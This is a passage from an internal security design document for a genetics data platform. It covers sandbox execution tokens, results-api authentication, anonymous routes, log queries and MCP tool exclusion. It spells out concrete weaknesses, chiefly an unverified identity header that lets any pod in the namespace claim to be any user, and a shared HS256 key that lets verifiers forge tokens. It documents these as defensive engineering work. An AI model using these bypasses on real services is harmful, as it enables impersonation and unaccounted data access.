   sizing above is an argument about honest volume and says nothing about an attacker, and there
   is no per-tenant fairness behind either number. Limitation 1's sandbox half is now closed —
   the SDK sends the per-execution token and nothing else (`4h6.44`) — but the counters were
   never a fairness mechanism, and the intentional internal-secret residue means an
   internal-secret caller inside the namespace still reaches these pod-wide surfaces without
   being accounted. They are sized far
   above honest use precisely so an honest execution never meets them, and both fail toward
   refusing new work rather than corrupting a running execution's accounting.

Production impact today is nil for the counters themselves: no sandbox Deployment is applied (the
manifest exists since `4h6.7`, gated off) and
`SANDBOX_ENABLED` is `"false"` on both services, so nothing but `tests/test_sandbox_budget.py`
(30 tests, offline lane) will report a regression in any of this. **The anonymous surface is the
exception and is live now**, since `ANONYMOUS_SURFACE_MINIMAL` defaults to on: six routes that
answered anonymous callers stop doing so at the next results-api deploy (see the ordering
constraint on `genetics-results-suite-618` above).

**The departure: `@is_public` routes are relaxed, not tight — and the measurement that
decided it.** Read literally, "no credential gets the tight limits" would apply the sandbox
caps to results-api's `@is_public` routes, because `auth_required` returns before
`get_verified_user` and no principal is resolved there at all. Re-derive that set with
`grep -rn "@is_public" app/` rather than trusting a count here — today it is **seven**:
`/api/v1/auth`, `/api/v1/variant_sets`, `/api/v1/variant_sets/{name}`, `/api/v1/rsid/variants`
GET and POST, and — missed by earlier drafts of this section, which said five — `/api/v1` and
`/healthz` (`app/server.py`), each of which returns a fixed handful of bytes.
Those routes are the browser's, reached through bff (`bff/inputParse.ts:81` and `:215`).

The first question was whether tight caps there would truncate or 429 a real browser request.
Measured, they would not, and the numbers are worth recording because they are the reason this
is a judgement call rather than a forced one:

| public route | production calls, `timestamp >= "2026-07-13" AND timestamp < "2026-08-12"` | largest response possible | vs the 16 MiB cap |
|---|---|---|---|
| `GET /api/v1/rsid/variants` | 64 | ~700–1 300 rows, bounded by URL length (nginx `large_client_header_buffers` 8k, h11's 16 KiB) rather than by code | <1% |
| `POST /api/v1/rsid/variants` | 0 (never seen in production) | was **unbounded in code**; now 5 000 ids (`app/routers/rsid.py` `MAX_RSIDS`), enforced for every caller | <1% |
| `GET /api/v1/variant_sets/{name}` | 3 | 888 rows / 18.6 KB (`FinnGen_enriched_202505`, the largest configured file) | 0.1% |
| `GET /api/v1/variant_sets` | 0 (never seen in production) | 3 rows / 74 B | — |
| `GET /api/v1/auth` | 0 (1 hit ever, 2026-03-07) | 1 object / ~90 B | — |
| `GET /api/v1` | 0 (4 hits ever, last 2026-05-20) | a fixed object of a few hundred bytes | — |
| `GET /healthz` | unmeasurable — excluded from usage logging by design | a fixed object of a few hundred bytes | — |

**Where these numbers come from, so they can be re-run.** `phewas-development.genetics_api_logs.stdout`
— the GKE production table — over the **fixed window `[2026-07-13 00:00 UTC, 2026-08-12 00:00 UTC)`**;
the "ever" figures are the same table unbounded (it starts 2026-03-06). The bounds are **literal
on purpose**: an earlier draft printed `TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 30 DAY)` while
labelling the window as calendar dates, so the query drifted a day per day away from the numbers
beside it and re-running it produced a different table every time (55 rather than 64 on the top
row, the whole of the disagreement). Re-run this query verbatim and you get the table above; change
the bounds and you are measuring something else, so change the counts with them. Query:

```sql
SELECT jsonPayload.http_method, jsonPayload.endpoint_path, COUNT(*) AS n, MAX(timestamp) AS last_hit
FROM `phewas-development.genetics_api_logs.stdout`
WHERE timestamp >= "2026-07-13" AND timestamp < "2026-08-12"
  AND jsonPayload.log_type = "endpoint_access"
GROUP BY 1, 2 ORDER BY n DESC
```

Add `AND jsonPayload.service = "results-api"` to exclude db-api's rows, which land in this same
table — but only for rows written on or after 2026-08-12; before that, see the three eras under
`docs/project-spec.md` → "Log sinks". Do **not** filter on
`jsonPayload.log_source = 'genetics-results-api-prod'`: results-api renamed
that value to `finngenie_prod` on 2026-06-03, so the old value returns nothing after that date and
no error — which is exactly why `service` exists and `log_source` is not the discriminator. Do
**not** query `genetics_api_logs.genetics_results_api`, which earlier drafts of this
table used — despite its name it is not the production service (see below).

An earlier draft's row asserting "`GET /api/v1`, `GET /healthz` — not in the sink" was wrong for
one and right for the other, for different reasons. `/api/v1` **is** logged; it simply gets
almost no traffic (4 hits in the table's whole history). `/healthz` is genuinely absent, but by
design rather than by disuse: it is in `usage_logging_excluded_paths`
(`app/config/common.py`, alongside `/api/v1/docs`, `/api/v1/redoc`, `/api/v1/openapi.json`,
`/favicon.ico`), so no volume of kubelet probes would ever appear. Its call count is therefore
not measurable from this sink at all — but it returns a fixed object either way, so nothing in
the argument turns on it.

The remaining zeroes are real and unsurprising: these public routes are the browser's, and the
browser is a small share of a service whose traffic is dominated by `mcp-tool` calls to
authenticated routes.

Sizes are measured from the GCS variant-set files and from auth-gateway's `$body_bytes_sent`
(external traffic only — bff and mcp-server reach results-api in-cluster and bypass the
gateway, so **no response size is logged for the dominant caller**). The middleware emits a
`jsonPayload`-only record, so `httpRequest.responseSize` is structurally NULL on every row of
this sink — there is no response-size data in it at all — and `full_path`, which would reveal
rsid counts, is stripped before Cloud Logging.

*What this table cannot show, and why an earlier draft got it wrong.* An earlier draft sourced
these counts from `phewas-development.genetics_api_logs.genetics_results_api` and added
"`user_email` is NULL on every one of these rows, confirming no principal is resolved". **Both
the counts and that inference are withdrawn.** The reason is not a sink artifact, a lag, or
anything about principals: **that table is a different machine's log.** A BigQuery log sink names
its table after the *log ID*, not after the service, so the table carrying the service's name is
the decoy — it is fed by the `genetics-results-api-dev1` GCE VM running the results-api **test
suite** (`sourceLocation.file` points inside a developer checkout; 1,638 entries within a single
second), while the production GKE rows are in `stdout`. Every number in the old table therefore
measured a developer's tests, and its all-NULL `user_email` was a property of test traffic, not
of production principals. See `docs/project-spec.md` → "Log sinks" for the full account. The
table above is re-measured against `stdout`; sizes are still not available from any sink, so the
no-truncation conclusion below rests — as it already did — on the caps being unreachable by the
largest response this code can produce, not on logged size data.

So capping them would not regress anything today. They are nonetheless **relaxed**, because the
exception costs nothing and the alternative does not: these routes already answer the open
internet with no credential and bill no BigQuery, so tight caps would constrain only *anonymous*
browser traffic, while carrying a real regression risk if a curated variant set is ever
configured with more than 25 000 variants. `REQUIRE_AUTH=false` (local development; the shipped
`results-api.yaml` sets `"true"`) is relaxed for the same reason.

**And with the minimal anonymous surface the exception has nothing left to apply to.**
Everything above is the wide-surface shape — the behaviour that predates the sandbox, and the
reason the relaxation is still described rather than deleted; it now requires an explicit
`ANONYMOUS_SURFACE_MINIMAL=false`. With that flag at its default (or forced by
`SANDBOX_ENABLED`), `is_public_endpoint` answers true for `/healthz` only, so six of the seven
routes stop being anonymous and get whatever their caller's principal earns them: relaxed for the BFF's shared secret and for a verified user,
tight for a sandbox token. The table above is what says this costs the browser nothing —
64 + 3 + 0 + 0 + 0 calls in a month.

*How those calls arrived is an architectural claim, not a measured one, and an earlier draft
overstated it.* That draft said "every one of them arriving through `auth_request /oauth2/auth`
and then the BFF". **The usage log cannot show that, by construction, on precisely these seven
routes.** `middleware_usage_logging` attributes a caller two ways: the internal secret plus an
allow-listed `X-Goog-Authenticated-User-Email`, or a fallback that reads
`request.state.authenticated_user`. On an `@is_public` route that state is **never set** —
`auth_required` returns at `is_public_endpoint` before `get_verified_user` runs — so the fallback
is dead there, and a caller presenting the internal secret logs *identically* to one presenting
nothing. Measured: `user_email` is NULL on 246 of 246 rows for the rsid route over 90 days, which
distinguishes nothing.

The guarantee is therefore **architectural**: `k8s/deployments/auth-gateway.yaml` routes every
browser `/api/` request through `auth_request /oauth2/auth` to the BFF, which attaches the shared
secret as its own `Authorization: Bearer` on the upstream call (`bff/upstream.ts`; the paths are
`bff/inputParse.ts:81` and `:215`), and a programmatic client reaches the same routes through
auth-gateway's `@api_bearer` with its own bearer. Nothing entering the cluster from outside can be
anonymous at results-api. **No production caller of these routes is anonymous at results-api** is
a statement about the ingress paths that exist, not an observation from the logs, and it is what
makes requiring a principal free rather than a trade-off.

*The three alternatives that were rejected, because each looks reasonable until it is checked.*

- **Require the *sandbox* token on all routes.** Cannot be written: results-api sees a browser
  request and a sandbox request identically on `:4000`, and `/healthz` is probed by the kubelet,
  which holds no credential at all. Requiring *a* principal instead sidesteps the whole
  identification problem, which is why that is what shipped.
- **Take `results-api:4000` off the sandbox's egress allow-list** and force its traffic down a
  path that always carries the token. This was the preferred option when the work was filed, on
  the premise that "the sandbox has no reason to call an unauthenticated route". **The premise is
  false.** `GeneticsClient.search(rsids=...)` calls `ToolExecutor.lookup_variants_by_rsid`, which
  issues `GET {results-api}/v1/rsid/variants` — one of the seven. And the census in
  `genetics-results-suite-6uk` puts 16 of the SDK's 25 public functions on results-api alone with
  5 more branching to it, so the allow-list entry is load-bearing for most of the SDK, not just
  for that one call. There is also no path with the property the option asks for: the sandbox is
  denied auth-gateway by design (section 3), and auth-gateway would not validate a sandbox HS256
  token anyway. A dedicated results-api port would give a discriminator NetworkPolicy can
  enforce — egress evaluates the destination **pod** port on this dataplane, so it would take a
  second listening socket in results-api, not a second Service port — and that remains available
  if a future control needs to distinguish the sandbox at the transport layer. It was not needed
  to close this hole.
- **A pod-wide bound on anonymous requests.** Caller-agnostic, but it is a rate limiter by
  another name (`genetics-results-suite-8zk`), and set low enough to matter it answers 429 to
  browser traffic on routes the browser owns. Removing the anonymous surface removes the thing
  the bucket would have had to meter.

*Enforcement, since the control is two booleans in one function.* `results-api`
`tests/test_anonymous_surface.py` (12 tests, offline lane) reads the **live route table** and
pins the anonymous surface in both states: a new `@is_public` decorator fails
`test_the_public_route_set_is_what_the_docs_claim`, and one that also survives the minimal
surface fails `test_the_minimal_anonymous_surface_is_exactly_healthz`. Three further tests pin
the flag itself — that an empty environment yields the minimal surface and a typo does not widen
it, that `SANDBOX_ENABLED` forces it over an explicit `false`, and that turning the sandbox off
does **not** re-open the surface, which is the regression `genetics-results-suite-rhh` was.
That test asserts against the **literal** `{"/healthz"}` on both sides; an earlier version
compared the computed surface to `ALWAYS_ANONYMOUS_PATHS` itself, which is tautological — adding
`/api/v1`, `/api/v1/auth` and `/api/v1/variant_sets` to the constant left all 8 tests passing.
Re-run against the fixed suite that same widening fails 2 tests. The route set is derived, never
listed, so it cannot rot the way a count in prose does.
`scripts/test-network-policies.py` cannot help here — it reads manifests and has no view of a
Python decorator — which is precisely why the assertion lives with the routes.
What these tests do **not** pin is accounting: only
`test_the_internal_secret_path_survives_but_the_sdk_no_longer_takes_it` drives a request; the
rest check a boolean predicate, which is exactly why the `INTERNAL_API_SECRET` bypass above was
invisible to the suite until it was measured by hand.

*A rollout coupling this created, and it was never the one the earliest draft described.* That
draft said flipping `SANDBOX_ENABLED` to `"true"` before `4h6.44` landed would make "every SDK
call 401". **Measured false at the time**: the SDK authenticated with `INTERNAL_API_SECRET`
read from the environment, that secret satisfies `is_internal_caller`, and driving the real
ASGI app with `SANDBOX_ENABLED=true` and `REQUIRE_AUTH=true` returned **200** on
`/api/v1/rsid/variants` and `/api/v1/variant_sets` as `user_email=mcp-tool`. The real hazard was
the opposite and worse: the SDK kept working while contributing nothing to the per-execution
budget, so the flip *looked* successful — no 401s, nothing in the logs to notice — while the
control it was supposed to activate stayed inert.

**`4h6.44` has landed and that hazard is gone**, along with the reasoning that produced it. The
SDK now builds its client from the per-execution tokens, so a sandbox request resolves a
principal, `admit` runs, and the counters are no longer empty. Two things this does **not**
change, both easy to over-read:

- The SDK does not 401 for a *missing* token either — it **raises before the request**, because
  `SANDBOX_TOKEN_FILE` being set with an unusable file is a misconfiguration, not a caller to
  degrade. Neither the old 401 story nor a silent-fallback story describes the current
  behaviour.
- `SANDBOX_ENABLED` still does not close "send the internal secret instead" *at results-api* —
  it never could, since that path serves chat-backend, mcp-server and bff. What closed it for
  the sandbox is that the sandbox no longer holds the secret (`4h6.7`) and the SDK no longer
  sends it (`4h6.44`).

**The commit that lands the sandbox workload and flips the flag still has to carry the
Deployment half (`4h6.7`)**, for the same reason as before: a sandbox pod holding
`INTERNAL_API_SECRET` re-opens the bypass regardless of what the SDK prefers, because a script
that can read `os.environ` can build its own client. This is the same commit
`genetics-results-suite-r22` already couples the label contract and the flag to; the
requirement is additive, not a new one.

**Why the exception has zero security delta — and the premise that had to be made true first.**
The earlier argument was that a sandbox script is capped on these routes either way, so relaxing
them changes nothing for it. That was half the story, and the missing half was a live break of
the invariant. On `POST /api/v1/rsid/variants`, `parse_and_validate_rsids` validated format and
never counted, and the handler read the body with an unbounded `await request.body()`. So a
script **presenting** its sandbox token got 25 000 rows / 16 MiB, while the same script
**omitting** the header got an unbounded response fully materialized in the pod — the absent
credential buying a strictly looser cap than the sandbox credential, which is exactly what this
section forbids. `k8s/network-policies/sandbox-policy.yaml` admits the sandbox to
results-api:4000 directly, bypassing auth-gateway, so its `client_max_body_size` never saw that
body either.

What makes the exception safe is therefore not the cap but that every public route bounds its
own response **for every caller**. `parse_and_validate_rsids` now rejects more than `MAX_RSIDS`
ids with a 422 and the POST bounds its body read as it streams, both with **no sandbox special
case** — a sandbox-only bound would leave the looser path open to the caller that simply
declines to identify itself, so the uniformity is what makes the invariant hold. `MAX_RSIDS` is
5 000, taken from the GET's own incidental ceiling: h11 caps the request line plus headers at
16 KiB and the shortest possible id costs 4 bytes in the query string ("rs1,"), so no GET that
works today can carry more than 4 096 ids. 5 000 therefore regresses nothing that currently
succeeds, while bounding the POST to a response of a few hundred KB. No bulk POST caller exists
today.

The other half of the change still holds and still matters: the sandbox principal is resolved in
`auth_required` **before** both short circuits, so a sandbox token is capped on a public route
and under `REQUIRE_AUTH=false` as well. It is not sufficient on its own, because it only
tightens the caller that chose to identify itself — which is why the invariant rests on the
uniform bound above. The invariant the section
above is really asserting — *a caller must never obtain looser limits by presenting a weaker
credential* — is preserved: a sandbox token is capped everywhere it is presented, and dropping
a verified credential on a route that requires one yields a 401, not a wider cap. What is
relaxed is the absence of a credential on a route that asks for none.

### results-api: weaker auth than db-api, and a bypass that must close first

Section 4 above works through db-api's `require_auth`. **results-api's authentication is a
different and weaker code path, and `4h6.9` must not assume the db-api reasoning transfers.**
Three specifics, all verified against the source:

1. **A forged identity header authenticates.** `genetics-results-api/app/core/auth.py`
   `get_verified_user()` calls `get_bearer_token_user()`, and when that returns `None` —
   which is what happens when there is **no `Authorization` header at all** — it falls
   through to `get_authenticated_user()`, which reads `X-Goog-Authenticated-User-Email` and
   splits it on `":"`. There is no proof of origin on that header. Anything that can reach
   results-api can name itself any user.
2. **Anything in the namespace can reach results-api.**
   `k8s/network-policies/policies.yaml` `allow-ingress-results-api` contains a rule with
   `- ports: - port: 4000` and **no `from:`**, which admits all sources. auth-gateway does
   handle the identity header correctly *at the edge*, but nothing forces traffic through
   auth-gateway, so any pod in the namespace bypasses it.
3. **Rule 2 of the db-api list is unimplementable here as written.**
   `get_bearer_token_user` runs `hmac.compare_digest` against the shared secret **first**,
   and only then routes on `"." in token`. A sandbox HS256 JWT contains dots, so if the
   sandbox validator is inserted after the dot check — or is allowed to fall through on
   failure — the token continues into `id_token.verify_oauth2_token`, where
   `GOOGLE_TOKEN_AUDIENCE` is unset in `k8s/deployments/results-api.yaml` and the code logs
   a warning and continues.
4. **And the dot test cannot be the discriminator, because results-api has another JWT
   caller.** Google Identity Tokens are three-segment JWTs too, and they are handled today
   at exactly that `if "." in token` branch. A rule of "JWT-shaped bearer → sandbox
   validator, hard 401 on failure, never a fallthrough" would therefore reject **every
   Google Identity Token results-api serves**. (The no-dots user-API-token path survives;
   the Google path does not.) This is the same correction as db-api rule 1, and here it is
   not latent — it is immediately fatal.

**Specification for `4h6.9` on the results-api side:**

- **Discriminate on the JOSE header.** Base64url-decode the first segment unverified, read
  `alg`, and treat the bearer as sandbox-shaped only when `alg == "HS256"` (optionally also
  requiring `iss == "chat-backend"`). RS256 bearers continue to `verify_oauth2_token`
  exactly as today; dotless bearers continue to the user-API-token path exactly as today.
  Safe for the same reason as db-api rule 1: the untrusted header only *selects* a
  validator, and each validator pins its own algorithm independently (`algorithms=["HS256"]`
  with the signing key, versus Google's RS256 certificates), so a forged `alg` changes only
  which validator rejects the token.
- Insert the sandbox validator **before** the `hmac.compare_digest` shared-secret
  comparison, not after it and not after the dot check. A sandbox-shaped bearer must never
  be compared against the shared secret, and must never reach `verify_oauth2_token`.
- Sandbox-validator failure is a **hard `401`**. Never a fallthrough to another auth path,
  never a warning-and-continue. This is the same fail-closed requirement as db-api rule 2,
  restated because the ordering in this file makes it easy to get wrong. It applies to
  HS256 bearers **only** — a non-HS256 bearer was never a sandbox token and its handling is
  unchanged.
- results-api carries its **own** row and response-size caps for the sandbox audience, on
  the same defaults-not-penalty basis as db-api above — with results-api's broader relax
  condition (**any** verified non-sandbox principal: shared secret, Google id_token, or
  per-user API token), because auth-gateway's `@api_bearer` location sends real users here
  with no shared secret. It currently has **no caps specified at all**, and it serves the
  bulkiest payloads in the suite (summary-statistic ranges, LD matrices) — a per-response
  byte ceiling matters more here than a row count.

**Blocking dependency.** Points 1 and 2 are **pre-existing bugs, not introduced by this
design**, and they are tracked as `genetics-results-suite-fad` (already filed). They are
not fixed here and results-api's authentication is not redesigned in this document — see
the bead. But the sandbox is the first caller of results-api that runs attacker-authored
code, so a scoped token is meaningless while an unauthenticated pod on the same network can
name itself any user: **`4h6.8` and `4h6.9` must not ship before `genetics-results-suite-fad`
is closed.**

**What the sandbox does *not* get:** `INTERNAL_API_SECRET`, `MCP_API_KEY`, any GCP
credential, any Keycloak client secret, any Perplexity/Tavily key, and no Kubernetes
service account token.

### As built (`4h6.9`) — what shipped, and where it departs from the above

Everything in this subsection is code that exists; everything above it that is not repeated
here is still design. Three files carry the mechanism:

| repo | file | role |
|---|---|---|
| genetics-mcp-server | `src/genetics_mcp_server/sandbox_token.py` | mint |
| genetics-results-db | `api/sandbox_auth.py` | verify (`aud: db-api`) |
| genetics-results-api | `app/core/sandbox_token.py` | verify (`aud: results-api`) |

**The minting contract `4h6.47` calls.** One call produces the pair for an execution:

```python
from genetics_mcp_server.sandbox_token import mint_execution_tokens

minted = mint_execution_tokens(user=<authenticated email>, session_id=<chat session id>)
minted.execution_id   # uuid4 — the jti of both tokens AND the /scratch/<id> directory name
minted.db_api         # aud: db-api
minted.results_api    # aud: results-api
minted.expires_at     # iat + 300
```

`execution_id` may be passed in when the caller has already chosen the `/scratch` directory
name; the two must be the same value or the log join in `4h6.12` does not close. Minting
raises `SandboxTokenUnavailable` when `SANDBOX_TOKEN_SIGNING_KEY` is unset — deliberately an
exception rather than a `None`, because every fallback from "no sandbox token" is either
"send no credential" or "send the shared secret", which are the two outcomes this whole
mechanism exists to prevent. `4h6.47` owns the POST body, and `4h6.43` everything downstream
of it inside the pod: the mode-0600 file under `/scratch/<id>` and the child's environment. **That
`0600` is hygiene, not a control**: under the decided shared-uid model (section 2, "The uid
choice") the supervisor and the child run as the same uid 65532, so the mode excludes nobody
who could otherwise read the file. The protection is **lifetime** — the SDK reads it once and
unlinks it — and nothing should be designed as if the mode were doing work.

**Deviations from the design above, all deliberate:**

1. **`iss` is required, not optional.** The design said routing may "optionally also require
   `iss == "chat-backend"`". Both validators pass `issuer="chat-backend"` to the decoder, so a
   token signed with the right key but issued by anything else is rejected. Routing still keys
   on `alg` alone; `iss` is a validation rule, not a routing rule.
2. **`iat` is checked explicitly.** PyJWT accepts an arbitrarily old `iat` as long as `exp` is
   in the future, so a token minted with a long TTL would outlive the 5-minute window. Both
   validators reject `iat` older than 300s, as rule 4 requires.
3. **`scope` is required to be present** but is not in the decoder's `require` list, because
   its absence is a distinct rejection reason worth logging separately. Its *value* is still
   uninterpreted, exactly as the table says.
4. **The per-credential caps are not implemented here.** Everything from "Implementation note
   for the caps" to the end of the numbers table — the 50 GB per-query ceiling, the 200 GB
   per-`jti` aggregate budget, the 25 000-row response cap, and results-api's response-byte
   ceiling — is **deferred to `genetics-results-suite-4h6.28`**. `4h6.9` ships the credential
   and the hook it needs: db-api leaves the resolved principal on `request.state.principal`
   (a `SandboxPrincipal`, the string `"internal"` for a shared-secret caller, or `None` for
   the fail-open and `/health` cases), and results-api leaves it on
   `request.state.sandbox_principal`. The "defaults-not-penalty" inversion is a behaviour
   change for *every* caller of both services and is not a credential change; keeping it out
   of this bead keeps the fail-closed work reviewable on its own.
5. **results-api reports a sandbox execution as `sandbox:<user>`, not as the bare email.**
   `get_verified_user` returns one string and it feeds both authorization and the
   `endpoint_access` log. Returning the bare email would make a sandbox request
   indistinguishable from a verified human, which is exactly the distinction `4h6.28`'s relax
   condition needs. The `sid` and `jti` are added to the `endpoint_access` line from
   `request.state.sandbox_principal`.
6. **db-api's `require_auth` no longer early-returns on `/health` *before* clearing state.**
   It sets `request.state.principal = None` first, so no handler can read a stale principal.
7. **Minter invariants are asserted by the verifiers, not assumed.** `options={"require": …}`
   rejects only *missing* or null claims, so both validators additionally reject an empty
   `sub`, `sid` or `jti` (a token attributing the query to nobody defeats the point of the
   credential), and require `aud` to be exactly a **string** — PyJWT treats a list `aud` as
   membership, so `{"aud": ["db-api", "results-api"]}` would otherwise validate at *both*
   services and one-token-per-audience would be a minter property only.
8. **`leeway=5` on both `jwt.decode` calls**, for the forward-direction skew the ttl cannot
   cover — see "Clock skew" above. The `MAX_TOKEN_AGE_SECONDS` check is unaffected.
9. **Rule 5's logging works differently on the two services.** db-api logs a *dict* message,
   which its formatter merges into `jsonPayload` verbatim. results-api's `GCPJsonFormatter`
   copies `extra=` fields only for names on the `EXTRA_LOG_FIELDS` allow-list when the message
   is a string, so `sub`, `sid` and `jti` were added to that list — without them the
   "sandbox request authorized" line reached the sink with no attribution at all. The
   `endpoint_access` line's `sid`/`jti` come from `request.state` on the middleware's dict
   path and were never affected.

**Where the token sits in each validator's precedence.**

- **db-api** — `require_auth`: `/health` → sandbox-shaped bearer (hard 401 on failure) →
  unset-`INTERNAL_API_SECRET` fail-open → `hmac.compare_digest`. The sandbox branch is
  ahead of the fail-open early return, which is rule 1.
- **results-api** — `get_verified_user`, as a new **case 0** ahead of the four cases
  `genetics-results-suite-fad` established: sandbox token → `sandbox:<user>`; then internal
  marker + identity header; then internal marker alone → `mcp-tool`; then Google id_token /
  user API token; then identity header alone → `None`. The same check is also first inside
  `get_bearer_token_user`, so a direct caller of that function cannot skip it. A sandbox
  caller holds no shared secret, so it cannot present the trusted-proxy marker and any
  identity header it sets is already discarded by case 5.

**No collision with `genetics-results-suite-fdd`.** That bead is about
`GOOGLE_TOKEN_AUDIENCE` being the public gcloud CLI client id, so the `aud` check on the
Google path binds nothing. The sandbox path never reaches `verify_oauth2_token`: an HS256
bearer is routed away before it, and an RS256 bearer is never routed to the sandbox
validator. The two audience checks are separate code, separate keys and separate claim
spaces; `4h6.9` neither fixes nor worsens `fdd`.

**A gap that was an attribution gap as much as an authorization one — now closed, and closed
where it was said it would have to be: in the public-route set, not in the credential.**
results-api's `auth_required` returns before any credential check when `REQUIRE_AUTH` is false
or the route is `@is_public`. With no sandbox principal resolved, `request.state.sandbox_principal`
is unset and the `endpoint_access` line carries **no `sid` and no `jti`**, so section 6.2's
control 3 — "what did that script actually read?" — was blind on that route set, and `4h6.28`'s
per-credential caps, which key on the resolved principal, did not apply there either.

Since `genetics-results-suite-0lf`, `is_public_endpoint` answers true only for
`ALWAYS_ANONYMOUS_PATHS` (`/healthz`) whenever `ANONYMOUS_SURFACE_MINIMAL` is on — its default,
and forced by `SANDBOX_ENABLED` (`genetics-results-suite-rhh`) — so with the sandbox deployed
there is no route a script can reach without presenting its token, and every request it
makes is both bounded and attributable. Two residues remain, both narrow: `/healthz` itself is
anonymous and unattributed (a constant document on no data path, excluded from usage logging by
design), and under `REQUIRE_AUTH=false` — local development only; the shipped `results-api.yaml`
sets `"true"` — the short circuit still fires. The sandbox principal is nevertheless resolved
ahead of *both* short circuits in `app/dependencies.py:auth_required`, so a token that is
presented is still honoured in dev.

### Deploy ordering: there is no ordering hazard, and one configuration lockout

Unlike `fad` (bff before results-api) and `th2` (auth-gateway before chat-backend), **the
sandbox credential path is entirely new: no caller sends an HS256 bearer today, and none will
until `4h6.7` and `4h6.47` land the sandbox and the client that calls the minter.** The sending and receiving
sides can therefore ship in either order, and the table is short:

| state | chat-backend mints | db-api / results-api verify | result |
|---|---|---|---|
| neither shipped | no | no | current behaviour, unchanged |
| **validators only** | no | yes | **safe.** Nothing sends an HS256 bearer, so the new branch never fires. Every existing credential type is unaffected — shared secret, Google id_token, per-user API token, trusted-proxy marker |
| **minter only** | yes | no | **safe today**, because nothing calls the minter until `4h6.47`. Were a token sent, an old db-api would 401 it at `compare_digest` and an old results-api would 401 it at `verify_oauth2_token` — a failed request, never an authorization |
| both shipped | yes | yes | the sandbox path works |

The real ordering constraint is **the secret, not the code**: all three Deployments mount
`sandbox-token-signing-key` from `genetics-secrets`, so `create-secrets.sh` must run before
the manifests are applied or the pods sit in `CreateContainerConfigError`. `deploy.sh` now
checks that key (and `internal-api-secret`) is non-empty before applying anything, so an
older `genetics-secrets` that predates this work fails at deploy time rather than at pod
start.

The one lockout is **`SANDBOX_ENABLED=true` with either secret missing**, which is
`sys.exit(1)` in both services by design — a crash-looping db-api and results-api is the
whole suite down. Both manifests therefore ship it as `"false"`; the deploy that creates the
sandbox Deployment (`4h6.7`) flips it, and must do so only after `create-secrets.sh` has run.
**Rollback direction: set `SANDBOX_ENABLED=false` and restart** — that restores service
immediately without touching secrets or images, and only disables the startup assertion, not
the token validation. Since `genetics-results-suite-rhh` it also does **not** re-open
results-api's anonymous surface, which is what it used to do: that is now
`ANONYMOUS_SURFACE_MINIMAL`, declared `"true"` in `k8s/deployments/results-api.yaml`, defaulting
to on when unset, and merely *forced* by `SANDBOX_ENABLED`. The incident lever and the security
lever are separate, and the security one no longer fails open when the other is flipped under
pressure.

**Rotating the signing key — not atomic, and it is an outage window, not one lost execution.**
`create-secrets.sh` reuses the value already in the cluster and only generates on first
install, like `internal-api-secret`. But all three Deployments read the key from the
environment, which freezes at *pod start*: updating the Secret changes nothing until each pod
restarts, and a rolling restart of three Deployments is not simultaneous. For the whole
restart window the minter and a verifier disagree about the key, and **every sandbox execution
routed to a pod on the other side of the rotation 401s** — not just the tokens in flight at
the moment of the change. Sequence it deliberately: patch the Secret, restart all three, and
treat sandbox executions as failing until the last pod is Ready. Nothing else breaks (the
shared-secret, Google id_token and user-API-token paths are untouched), and the rollback is
the same operation in reverse.

**If a Deployment's env is missing the key entirely**, either fix works. Re-running
`create-secrets.sh` is safe for the optional keys — it reuses whatever is already in the cluster
for every key it is not given in the environment, so the ones you have not exported
(`openai-api-key`, `tavily-api-key`, `perplexity-api-key`, `cohere-api-key`, `mcp-api-key`,
`external-mcp-servers`, `admin-users`, `slack-webhook-url`) survive untouched. It does require
`ANTHROPIC_API_KEY` to be exported: that key alone is never read back from the cluster, and
without it the script aborts before writing anything. Without that key to hand, use the targeted
`kubectl patch secret genetics-secrets --type=merge` on the one missing key instead —
`deploy.sh`'s secret gate prints both options.

**Accepted residual: a symmetric key means db-api and results-api can mint.** HS256 is one
secret shared by all three services, so verification and *minting* are the same capability.
A compromise of db-api or results-api yields a key that forges tokens impersonating
chat-backend with any `sub`, `sid` and `jti` — attribution in the `endpoint_access` log is
only as trustworthy as the least-trusted holder of the key. This is accepted for v1: both
verifiers are first-party services in the same namespace, and a compromise of either already
gives an attacker direct query access without needing a token at all. The clean fix is
**asymmetric signing** — Ed25519 (or RS256) with the private half mounted only on
chat-backend and the public half on the verifiers — which removes the mint capability from the
verifiers while keeping validation fully offline, the property that ruled out introspection in
the first place. Deliberately not done here: it is a claims-compatible swap of algorithm and
key material that can land on its own, and folding it into `4h6.9` would make the fail-closed
work harder to review.

---

## 5. MCP exposure

The user's requirement is explicit and non-negotiable: **people must not be able to execute
code via MCP calls.** Three layers enforce it. **Each is independently required** — the
design assumes any one of them can be defeated by a future refactor, a config change or a
mistake, and requires that the other two still hold.

### Layer 1 — tool registration (`4h6.16`)

`genetics-mcp-server/src/genetics_mcp_server/mcp_server.py` builds

```python
_mcp_disabled = _settings.disabled_tools | {
    "search_scientific_literature",
    "web_search",
    ...
}
register_mcp_tools(mcp, executor, disabled_tools=_mcp_disabled)
```

Add `run_analysis` and `read_artifact` to that literal set — the hardcoded half, not
`_settings.disabled_tools`, which is env-driven and therefore changeable without a code
review. Follow the existing pattern including the explanatory comment: the current comment
distinguishes technical limits ("uses Perplexity API") from product decisions; this one is
a security control and should say so.

**Half of this has landed.** `4h6.15` added `read_artifact` to the literal set in the same
change that defined the tool. That was not eagerness about a `4h6.16` deliverable: a tool is
registered on `/mcp` from the moment its definition exists unless it is excluded, so
deferring the exclusion would have shipped a window in which the tool was live over MCP.
`run_analysis` joins it with `4h6.16`. The `code` `TOOL_PROFILE` and the route-level
assertion below remain `4h6.16`'s.

**`list_capabilities` is deliberately *not* excluded, and the reason is not that it
discloses nothing.** Keeping it out of the set is still the right call — an exclusion set
padded with names that are not security controls stops reading as a security control, and
the next reader can no longer tell which entries are load-bearing. But an earlier version of
this passage justified it with "it discloses no data, no session state and no execution" and
with the claim that an MCP client can already see what it renders. The second argument is
simply false: the SDK is not the MCP tool surface, and the catalogue is new disclosure to an
MCP client. It is accepted **on its content**, which was measured by diffing the tool's real
output against everything an MCP client can otherwise reach:

- **Removed.** The output used to carry each module's `__doc__`, and through it
  `INTERNAL_API_SECRET`, `GENETICS_API_URL`, `BIGQUERY_API_URL`, the name `results-api`, and
  an internal bead id. Module docstrings are now stripped from the rendered output — the
  index carries hand-written one-line summaries instead — so those are gone.
- **Still disclosed, and accepted rather than denied — stated as categories, deliberately.**
  Function docstrings are the thing the catalogue exists to render, and what they leak falls
  into four kinds: the **settings mechanism** (e.g. `_URL_SETTINGS`), **internal service and
  component names** (e.g. `db-api`), the **execution model** — that a code-execution sandbox
